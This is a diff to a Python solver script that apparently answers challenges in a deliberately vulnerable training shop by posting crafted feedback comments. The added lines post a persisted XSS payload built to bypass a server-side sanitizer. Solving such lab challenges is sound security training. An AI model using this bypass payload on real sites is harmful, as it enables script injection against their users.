@@ -102,6 +102,8 @@ for i in range(11):
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Eurogium Edule Hueteroneel','rating':3})
 # ---- Legacy Typosquatting (Inform the shop about a typosquatting trick it has been a victim of at least in v6.2.0-SNAPSHOT. (Mention the exact name of the culprit))
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'epilogue-js','rating':3})
+# ---- Server-side XSS Protection (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism.)
+requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'<<script>Foo</script>iframe src="javascript:alert(`xss`)">','rating':3})
 # ---- Steganography (Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character))
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Pickle Rick','rating':3})
 # ---- Vulnerable Library (Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment))
